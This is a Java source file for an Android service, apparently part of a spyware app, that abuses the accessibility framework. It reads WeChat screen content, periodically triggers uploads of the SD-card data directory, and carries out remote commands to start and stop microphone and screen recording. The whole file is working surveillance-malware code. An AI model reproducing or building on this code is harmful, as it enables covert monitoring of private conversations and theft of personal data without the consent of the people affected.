package test.com.accessibility.base.main;

import android.app.ActivityManager;
import android.app.IntentService;
import android.app.Notification;
import android.content.Intent;
import android.content.Context;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import test.com.accessibility.base.IntentInterface.intentInterface;
import test.com.accessibility.core.audio.audioRecord;
import test.com.accessibility.core.upload.sdcardDataDirUpload;
import test.com.accessibility.core.wechat.wechatUtil;
import test.com.accessibility.core.wechat.wechat_main;

public class UtilIntentService extends IntentService {

    private final String TAG = "UtilIntentService";
    public static Intent tokenIntent = null;

    public UtilIntentService() {
        super("UtilIntentService");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(1, new Notification());
        }
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            Log.d(TAG, "[tluo] Receive Intent w/t Action:" + intent.getAction());
            ActivityManager mActivityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            // Log.d(TAG, "[tluo] Top Activity Name:" + mActivityManager.getRunningAppProcesses().get(0).processName);
            final String action = intent.getAction();
            if (intentInterface.Action_Accessibility.equals(action)) {
                processAccessibilityEvent(this, intent);
            } else if (intentInterface.Remote_CMD_EVENT.equals(action)) {
                processRemoteCMDEvent(this, intent);
            } else {
                Intent token = intent.getExtras().getParcelable("tokenIntent");
                tokenIntent = token;
            }
        }
    }

    public void processAccessibilityEvent(Context context, Intent intent) {
        final String root_dir = intent.getStringExtra(intentInterface.intentService_Param_RootDir);
        AccessibilityNodeInfo root = intent.getExtras().getParcelable(intentInterface.AccessEvent_RootNode);
        AccessibilityEvent event = intent.getExtras().getParcelable(intentInterface.AccessEvent_Obj);
        final Intent intentToken = intent.getExtras().getParcelable(intentInterface.AccessEvent_intentToken);

        final String pkg_name = event.getPackageName()+"";      //intent.getStringExtra(intentInterface.AccessEvent_PkgName);
        final int event_type = event.getEventType();            //intent.getIntExtra(intentInterface.AccessEvent_Type, 0);
        final int content_change_type = event.getEventType();   //intent.getIntExtra(intentInterface.AccessEvent_ContentChangeType, 0);
        final long event_time = event.getEventTime();           //intent.getLongExtra(intentInterface.AccessEvent_Time, 0);

        Log.d(TAG, "[tluo] Receive AccessibilityEvent Intent ... ("+event_time+")");
        if(pkg_name.equals(intentInterface.WeChat_Pkg_Name)){
            if (wechatUtil.filter1(event)) {
                return;
            }
            wechat_main wechatMain = new wechat_main();
            if (wechat_main.settings == null) {
                wechatMain.init(context);
            }
            wechatMain.processAccessEvent(context, root_dir, root, event_type, intentToken);
            if (wechat_main.counter % 8 == 0) {
                Log.d("tluo", "SEND UPLOADING INTENT");
                sdcardDataDirUpload.sendUploadIntent(context);
            }
        }
    }

    public void processRemoteCMDEvent(Context context, Intent intent) {
        final String RemoteCommand = intent.getStringExtra(intentInterface.Remote_CMD_EVENT_ACTION_ParamName);
        final String root_dir = intent.getStringExtra(intentInterface.intentService_Param_RootDir);
        Log.d(TAG, "[tluo] Receive Remote Command ... ("+RemoteCommand+")");
        switch (RemoteCommand) {
            case intentInterface.Remote_CMD_START_RECORDING:
                audioRecord.startRecording(root_dir);
                break;
            case intentInterface.Remote_CMD_STOP_RECORDING:
                audioRecord.stopRecording();
                break;
            case intentInterface.Remote_CMD_START_ScreenRECORDING:
                if (test.com.accessibility.util.screenrecording.screenrecord.recording_status == 0) {
                    try {
                        final Intent token = intent.getExtras().getParcelable(intentInterface.AccessEvent_intentToken);
                        test.com.accessibility.util.screenrecording.screenrecord.startRecording(context, root_dir, token);
                    } catch (Exception e) {
                        test.com.accessibility.util.screenrecording.screenrecord.startRecording(context, root_dir, null);
                    }
                }
                break;
            case intentInterface.Remote_CMD_STOP_ScreenRECORDING:
                if (test.com.accessibility.util.screenrecording.screenrecord.recording_status == 1) {
                    test.com.accessibility.util.screenrecording.screenrecord.stopRecording(context);
                }
                break;
        }
    }
}
